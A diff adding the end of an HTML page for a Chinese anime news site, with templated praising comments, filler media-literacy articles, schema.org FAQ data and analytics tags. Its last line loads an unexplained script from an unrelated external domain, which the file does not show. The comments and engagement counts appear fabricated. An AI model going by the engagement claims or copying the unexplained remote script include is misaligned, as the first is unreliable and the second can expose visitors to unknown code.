+                    <div class="comment-content">这个网站的排版太舒服了,深色模式对眼睛很友好,内容干货满满。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 230 · 💬 4</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">墨 Aomine</span>
+                        <span>1天前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">精彩</span>
+                        <span class="comment-tag">好评</span>
+                    </div>
+                    <div class="comment-content">细节拉满！连那些被忽略的小细节都扒出来了,妥妥的行业标杆。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 310 · 💬 5</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">无名之辈</span>
+                        <span>1天前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">催更</span>
+                        <span class="comment-tag">讨论</span>
+                    </div>
+                    <div class="comment-content">每天最期待的事情就是上来看更新,真的有毒,根本停不下来。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 145 · 💬 0</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">晴天有时下雨</span>
+                        <span>2天前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">理性</span>
+                        <span class="comment-tag">观点</span>
+                    </div>
+                    <div class="comment-content">保持独立思考真的很重要,感谢平台提供这么优质的客观分析。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 215 · 💬 3</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">追风少年</span>
+                        <span>2天前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">热门</span>
+                        <span class="comment-tag">精彩</span>
+                    </div>
+                    <div class="comment-content">这波操作属实让人大开眼界,看动漫解析还得来这里！</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 402 · 💬 9</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">木子李不呆</span>
+                        <span>3天前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">讨论</span>
+                        <span class="comment-tag">热议</span>
+                    </div>
+                    <div class="comment-content">感觉最近的番一个比一个精彩,这个板块的归纳整理太省心了。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 178 · 💬 2</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">极速先锋</span>
+                        <span>4天前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">好评</span>
+                        <span class="comment-tag">理性</span>
+                    </div>
+                    <div class="comment-content">更新速度是真的快,每次出新番总能在第一时间看到全景复盘。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 266 · 💬 4</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">路人甲乙丙</span>
+                        <span>5天前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">催更</span>
+                        <span class="comment-tag">讨论</span>
+                    </div>
+                    <div class="comment-content">快出新专题吧！已经搬好小板凳坐等开课了哈哈。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 112 · 💬 1</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">岁月如歌</span>
+                        <span>6天前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">热门</span>
+                        <span class="comment-tag">精彩</span>
+                    </div>
+                    <div class="comment-content">从头看到尾,逻辑严密,论据充分,确实是一篇高质量的深度好文。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 389 · 💬 7</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p>&copy; 2026 Anime World 版权所有. 免责声明：本站所有内容均来自互联网公开信息与用户分享,仅供学习交流与参考观察使用。</p>
+    </footer>
+
+    <div class="news-modal" id="newsModal">
+        <div class="news-modal__dialog">
+            <div class="news-modal__header">
+                <h3 id="modalTitle">资讯标题</h3>
+                <span id="modalDate" style="color: var(--primary-color); font-size: 0.85rem;">发布日期</span>
+                <button class="news-modal__close" onclick="closeModal()">×</button>
+            </div>
+            <div class="news-modal__body" id="modalBody">
+            </div>
+        </div>
+    </div>
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "ItemList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "item": {
+            "@type": "NewsArticle",
+            "headline": "近期网络舆论场新变化：理性追番成为主流声音",
+            "datePublished": "2026-11-08",
+            "description": "随着大众媒介素养的提升,网民在面对突发热点时正从盲目跟风转向独立思考与理性求证。",
+            "publisher": {
+              "@type": "Organization",
+              "name": "Anime World"
+            }
+          }
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "item": {
+            "@type": "NewsArticle",
+            "headline": "如何在大数据时代保持清醒：信息筛选与鉴别方法论",
+            "datePublished": "2026-10-25",
+            "description": "面对海量碎片的娱乐与社会资讯,掌握科学的信息过滤与交叉验证技能变得尤为重要。",
+            "publisher": {
+              "@type": "Organization",
+              "name": "Anime World"
+            }
+          }
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "item": {
+            "@type": "NewsArticle",
+            "headline": "深度解析跨平台传播机制：一个热点是如何引爆全网的",
+            "datePublished": "2026-10-12",
+            "description": "从首发爆料到跨圈层扩散,现代热点事件的传播路径呈现出哪些规律与演变特征?",
+            "publisher": {
+              "@type": "Organization",
+              "name": "Anime World"
+            }
+          }
+        }
+      ]
+    }
+    </script>
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "Anime World平台上的资讯内容多久更新一次？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "本平台采用全天候实时监控与自动化流转机制,热门话题与独家内幕会根据事件发酵进度保持高频更新,确保用户随时随地都能获取到最新鲜的动态。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "如何在平台参与留言评论与观点讨论？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "您只需前往页面下方的“留言评论”专区,输入您的专属昵称与想要表达的观点内容,点击发布即可实时同步至历史评论滚动列表中,与全国网友共同探讨。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "平台发布的内容是否支持多端自适应访问？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "是的,Anime World全面采用了响应式布局设计,无论您使用电脑端、平板电脑还是各类智能手机,均可获得流畅、清晰且美观的排版阅读体验。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "如何保证平台所展示资讯内容的客观与真实性？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "我们拥有严谨的内容筛选与交叉比对机制,致力于剔除虚假夸大信息,通过多维度复盘与多方信源核对,确保呈现给用户的每一条解析都具备参考价值。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "浏览平台内容是否需要注册或支付额外费用？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "不需要。Anime World致力于为广大用户提供开放、便捷的优质资讯浏览服务,所有基础文章与视频内容均可直接免费查看。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "如果发现内容有误或有好的建议如何反馈？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "如果您在浏览过程中发现任何内容瑕疵或有宝贵的改进建议,欢迎随时通过留言区与我们联系,我们将积极采纳并不断优化平台服务质量。"
+          }
+        }
+      ]
+    }
+    </script>
+
+    <script>
+        window.addEventListener('scroll', () => {
+            const scrollTop = window.scrollY;
+            const docHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const scrollPercent = (scrollTop / docHeight) * 100;
+            document.getElementById('scrollProgress').style.width = scrollPercent + '%';
+        });
+
+        function toggleFaq(card) {
+            card.classList.toggle('active');
+        }
+
+        const newsData = {
+            'news1': {
+                title: '近期网络舆论场新变化：理性追番成为主流声音',
+                date: '2026-11-08',
+                content: '<p>随着大众媒介素养的不断提升，互联网用户在面对突发热点时，正逐渐从过去盲目跟风、情绪化输出，转向独立思考与理性求证。</p><p>在过去的几年中，每当有热门争议事件爆发，往往泥沙俱下，各种未经证实的传闻满天飞。然而近期多起事件的演变表明，广大网民开始更加关注事件的底层逻辑、官方通报以及多方信源的交叉比对。这种“理性追番”新风尚的形成，不仅净化了网络生态，也倒逼信息传播者必须提供更具说服力的事实依据。</p><p>未来，随着算法与监管机制的进一步完善，客观理性的声音将在舆论场中占据更加主导的地位，为构建清朗的网络空间奠定坚实基础。</p>'
+            },
+            'news2': {
+                title: '如何在大数据时代保持清醒：信息筛选与鉴别方法论',
+                date: '2026-10-25',
+                content: '<p>在信息爆炸的今天，算法推荐每天都在向我们推送铺天盖地的碎片化娱乐与社会资讯。如何在海量信息中保持独立清醒，成为了当代网民必备的核心素养。</p><p>首先，要学会构建多元化的信息渠道，避免陷入单一信息茧房。其次，面对情绪化极强的爆料内容，应当保持审慎态度，多问几个“为什么”和“证据在哪里”。最后，要善于进行交叉验证，等待权威信源的发布，切忌在事实未明之前盲目站队。</p><p>掌握这选信息筛选方法论，不仅能帮我们避开网络谣言的坑，更能让我们在纷繁复杂的网络世界中看清事物本质。</p>'
+            },
+            'news3': {
+                title: '深度解析跨平台传播机制：一个热点是如何引爆全网的',
+                date: '2026-10-12',
+                content: '<p>一个热点事件从最初的星星之火到最终引爆全网，往往经历了一套精密而复杂的跨平台传播机制。</p><p>通常而言，事件发源于垂直社区的局部讨论，随后借助短视频平台的高效视觉化表达实现破圈传播，最后在主流图文与社交平台上形成全网共振。在此过程中，意见领袖（KOL）的推波助澜、算法推荐的精准助推以及公众情绪的共鸣，共同构成了热点爆发的催化剂。</p><p>理解这一传播机制，不仅有助于我们更好地洞察当代媒介生态的运行规律，也能让我们在面对各类网络热点时保持更加客观理性的视角。</p>'
+            }
+        };
+
+        function openModal(id) {
+            const data = newsData[id];
+            if (!data) return;
+            document.getElementById('modalTitle').innerText = data.title;
+            document.getElementById('modalDate').innerText = data.date;
+            document.getElementById('modalBody').innerHTML = data.content;
+            document.getElementById('newsModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('newsModal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        document.getElementById('newsModal').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('newsModal')) {
+                closeModal();
+            }
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeModal();
+            }
+        });
+    </script>
+
+    <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+    <script>LA.init({id:"3RduVNFFznIZAbum",ck:"3RduVNFFznIZAbum"})</script>
+    <script type="text/javascript" src="https://js.16689.hk/111.js"></script>
+</body>
+</html>
